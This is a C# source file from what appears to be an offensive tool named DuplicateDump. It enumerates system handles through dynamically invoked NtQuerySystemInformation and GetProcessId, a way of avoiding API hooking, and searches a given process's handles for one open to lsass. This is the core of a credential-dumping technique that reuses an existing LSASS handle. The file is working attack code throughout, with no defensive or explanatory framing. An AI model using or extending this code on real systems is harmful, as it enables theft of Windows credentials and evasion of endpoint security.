using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.Data;

namespace DuplicateDump{

    public class ProcessUtility {

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct SYSTEM_HANDLE_INFORMATION {
            // Information Class 16
            public int ProcessID;
            public byte ObjectTypeNumber;
            public byte Flags; // 0x01 = PROTECT_FROM_CLOSE, 0x02 = INHERIT
            public ushort Handle;
            public int Object_Pointer;
            public UInt32 GrantedAccess;
        }

        public class ProcessHandle {
            public IntPtr Handle;
            public Process Process;
        }


        private const int OBJECT_TYPE_PROCESS = 0x7;

        static bool Is64Bits() {
            return Marshal.SizeOf(typeof(IntPtr)) == 8 ? true : false;
        }

        static List<SYSTEM_HANDLE_INFORMATION> GetHandles(Process process, int? type) {
 
            int nHandleInfoSize = 0x10000;
            IntPtr ipHandlePointer = Marshal.AllocHGlobal(nHandleInfoSize);
            int nLength = 0;
            IntPtr ipHandle = IntPtr.Zero;
            List<SYSTEM_HANDLE_INFORMATION> lstHandles = new List<SYSTEM_HANDLE_INFORMATION>();

            Object[] qrySystInfoArgs = { Structs.SYSTEM_INFORMATION_CLASS.SystemHandleInformation, ipHandlePointer, nHandleInfoSize, nLength };
            Native.NTSTATUS queryResult = (Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("ntdll.dll", "NtQuerySystemInformation", typeof(Delegates.NtQuerySystemInformation), ref qrySystInfoArgs);
            nLength = (int)qrySystInfoArgs[3];
            while (queryResult == Native.NTSTATUS.InfoLengthMismatch)
             {
                nHandleInfoSize = nLength;
                Marshal.FreeHGlobal(ipHandlePointer);
                ipHandlePointer = Marshal.AllocHGlobal(nLength);

                Object[] qrySystInfoArgs2 = { Structs.SYSTEM_INFORMATION_CLASS.SystemHandleInformation, ipHandlePointer, nHandleInfoSize, nLength };
                queryResult = (Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("ntdll.dll", "NtQuerySystemInformation", typeof(Delegates.NtQuerySystemInformation), ref qrySystInfoArgs2);
                nLength = (int)qrySystInfoArgs[3];
            }

            if (queryResult != 0) {
                Console.WriteLine($"[X] Failed to query handle information with error 0x{queryResult:x}");
                return lstHandles;
            }


            long lHandleCount = 0;
            if (Is64Bits()) {
                lHandleCount = Marshal.ReadInt32(ipHandlePointer);
                ipHandle = new IntPtr(ipHandlePointer.ToInt64() + 8);
            } else {
                lHandleCount = Marshal.ReadInt32(ipHandlePointer);
                ipHandle = new IntPtr(ipHandlePointer.ToInt32() + 4);
            }

            SYSTEM_HANDLE_INFORMATION shHandle;
            
            for (long lIndex = 0; lIndex < lHandleCount; lIndex++) {
                shHandle = new SYSTEM_HANDLE_INFORMATION();
                if (Is64Bits()) {
                    shHandle = (SYSTEM_HANDLE_INFORMATION)Marshal.PtrToStructure(ipHandle, shHandle.GetType());
                    ipHandle = new IntPtr(ipHandle.ToInt64() + Marshal.SizeOf(shHandle) + 8);
                } else {
                    ipHandle = new IntPtr(ipHandle.ToInt64() + Marshal.SizeOf(shHandle));
                    shHandle = (SYSTEM_HANDLE_INFORMATION)Marshal.PtrToStructure(ipHandle, shHandle.GetType());
                }
                if (shHandle.ProcessID != process.Id) continue;
                if(!type.HasValue)
                    lstHandles.Add(shHandle);
                else if(type.Value == shHandle.ObjectTypeNumber)
                    lstHandles.Add(shHandle);
            }
            return lstHandles;
        }

        public static ProcessHandle GetLsassHandle(Process process) {

            var processHandles = GetHandles(process, OBJECT_TYPE_PROCESS);
            
            foreach(var item in processHandles) {

                var procHandle = new ProcessHandle();
                
                IntPtr getProcessIdPtr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "GetProcessId", true);
                Object[] getProcessIdArgs = { (IntPtr)item.Handle };
                var procId = (int)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(getProcessIdPtr, typeof(Delegates.GetProcessId), ref getProcessIdArgs);

                procHandle.Handle = (IntPtr)item.Handle;
                if (procId > 0)
                    procHandle.Process = Process.GetProcessById(procId);
                if (procHandle.Process?.ProcessName == "lsass")
                {
                    return procHandle;
                }
            }

            return null;  
        }
    }
}
